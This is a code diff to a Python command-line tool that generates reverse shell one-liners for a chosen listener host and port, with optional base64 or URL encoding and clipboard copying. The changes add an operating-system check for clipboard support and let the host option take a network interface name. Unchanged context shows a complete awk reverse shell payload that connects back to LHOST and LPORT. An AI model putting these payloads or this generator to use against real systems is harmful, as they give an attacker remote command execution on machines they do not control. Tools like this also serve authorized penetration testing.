@@ -3,8 +3,9 @@
 from base64 import b64encode
 from urllib.parse import quote
 from psutil import net_if_addrs
-from sys import argv
+from sys import argv, platform
 from pyperclip import copy
+import subprocess
 
 shells = {
     'bash':{
@@ -93,9 +94,15 @@ shells = {
         '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
     }
 }
-##
+
+## START
 available_shells = " ".join([x.upper() for x in shells.keys()])
 result = ""
+
+# This should by default be 1 since pyperclip should not have any
+# problem handleing clipboard in Windows / MacOS, it will be set 
+# to 0 by the 'checkOS' function in case it's a LINUX system and xclip is not installed 
+clipboardAvailable = 1
 
 # ENCODING FUNCTIONS
 urlenc = lambda url : quote(url,safe='')
@@ -120,9 +127,16 @@ def usage():
 
 def printShellInfo():
     print(f"\n[+] Shell created [+]\n")
-    copy(result)
-    print(f"+ Type: {shellt}\n+ Name: {shelln}\n+ Command: {result}\n\n- Copied to clipboard")
-    
+    print(f"+ Type: {shellt}\n+ Name: {shelln}\n+ Command: {result}\n")
+    if clipboardAvailable:
+        try: 
+            copy(result)
+            print("- Copied to clipboard -\n")
+        except:
+            print("[!] error copying to clipboard, does the OS have a clipboard system?\n")
+    else:
+        print("[!] xclip not installed or not in $PATH, shell won't be copied to clipboard...\n")
+
 def checkShellType(shell):
     try:
         shells[shell]
@@ -167,8 +181,17 @@ def guidedCraft(sht,lh,lp,b64,url):
                 result = urlenc(result)
         n+=1
     printShellInfo()    
-        
-#
+
+def checkOS():
+    global clipboardAvailable
+    if platform.startswith("linux"):
+        try:
+            subprocess.check_output(['xclip','-version'], stderr=subprocess.STDOUT, universal_newlines=True)
+        except:
+            clipboardAvailable = 0
+
+# STARTING POINT 
+
 if len(argv) == 1:
     usage()
     exit(0)
@@ -190,7 +213,7 @@ elif shell == "--list" or shell == "-list":
     try:
         listsh = argv[2].lower()
     except IndexError:
-        print("[!] - Type of shell has to be given => ./reverse --list bash")
+        print("[!] - Type of shell has to be given e.g. ./reverse --list bash")
         print(f"\n[+] - Available shell types:\n{available_shells}")
         exit(0)
         
@@ -199,7 +222,10 @@ elif shell == "--list" or shell == "-list":
         for i in shells[listsh]:
             print(f"[*] {i} - {shells[listsh][i]}\n")
     exit(0)
-        
+
+# Check OS, xclip is required for pyperclip to work when using Linux OS
+checkOS()
+
 # Let's craft a reverse shell :)
 shellt = shell
 shelln = ""
@@ -226,7 +252,7 @@ for i in range(len(argv)):
         lport = argv[i+1]
     elif arg == "-lh" or arg == "--lhost":
         try:
-            lhost = net_if_addrs()["eth0"][0].address
+            lhost = net_if_addrs()[argv[i+1]][0].address
         except:
             lhost = argv[i+1]
     elif arg == "b64":
